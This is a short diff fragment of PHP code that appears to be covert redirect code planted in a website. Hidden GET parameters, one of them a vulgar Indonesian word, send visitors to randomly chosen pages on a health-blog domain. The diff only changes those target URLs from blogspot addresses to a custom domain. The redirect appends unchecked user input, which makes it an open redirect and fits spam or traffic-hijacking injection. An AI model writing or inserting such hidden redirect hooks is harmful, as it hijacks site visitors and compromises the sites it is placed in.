@@ -14,7 +14,7 @@ if(isset($_GET['rr-av2'])) {
 }
 if(isset($_GET['ngentot'])) {
   $url = $_GET['ngentot'];
-  $arr = array("https://www.funhealtykey.com/2022/09/4-recipes-to-gain-weight.html","https://funhealtykey.blogspot.com/2022/07/dangers-of-oxidized-food.html","https://funhealtykey.blogspot.com/2022/07/your-body-is-acidic-stop-consuming-sugar.html","https://funhealtykey.blogspot.com/2022/06/3-ways-to-balance-bodys-acidic-ph.html","https://funhealtykey.blogspot.com/2022/06/processed-products-and-leaky-gut.html","https://funhealtykey.blogspot.com/2022/06/how-to-stop-feeling-sleepy-after-eating.html");
+  $arr = array("https://www.funhealtykey.com/2022/09/4-recipes-to-gain-weight.html","https://www.funhealtykey.com/2022/07/dangers-of-oxidized-food.html","https://www.funhealtykey.com/2022/07/your-body-is-acidic-stop-consuming-sugar.html","https://www.funhealtykey.com/2022/06/3-ways-to-balance-bodys-acidic-ph.html","https://www.funhealtykey.com/2022/06/processed-products-and-leaky-gut.html","https://www.funhealtykey.com/2022/06/how-to-stop-feeling-sleepy-after-eating.html");
   header('location:'.$arr[array_rand($arr)].$url.'');
 } else {
  
